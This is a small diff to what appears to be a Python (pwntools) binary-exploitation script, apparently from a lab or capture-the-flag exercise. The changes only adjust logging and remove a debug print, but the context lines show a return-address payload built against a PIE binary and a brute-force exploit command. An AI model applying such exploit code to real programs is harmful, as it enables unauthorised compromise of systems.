@@ -189,7 +189,6 @@ def detect_crash(pid: int):
             for line in lines:
 
                 if pattern.search(line):
-                    print(line)
                     return True
 
     except FileNotFoundError:
@@ -237,7 +236,8 @@ def main():
         print(f"{target}: Permission denied")
         sys.exit(1)
 
-    # context.log_level='warn'
+    context.log_level='warn'
+    # context.log_level = 'debug'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
 
@@ -245,7 +245,6 @@ def main():
     construct_payload(ra_offset, target)
     attach_strace()
 
-    # context.log_level = 'debug'
 
     #performing brute force attack
     exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
